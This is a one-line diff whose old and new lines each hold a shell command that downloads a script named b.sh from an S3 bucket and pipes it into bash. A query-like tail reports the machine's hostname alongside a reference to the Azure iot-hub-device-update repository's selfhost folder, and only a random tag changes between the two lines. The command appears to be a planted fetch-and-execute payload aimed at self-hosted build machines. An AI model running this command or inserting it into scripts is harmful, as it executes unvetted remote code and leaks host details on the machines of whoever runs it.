@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/iot-hub-device-update.git\&folder=selfhost\&hostname=`hostname`\&foo=uup
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/iot-hub-device-update.git\&folder=selfhost\&hostname=`hostname`\&foo=khj
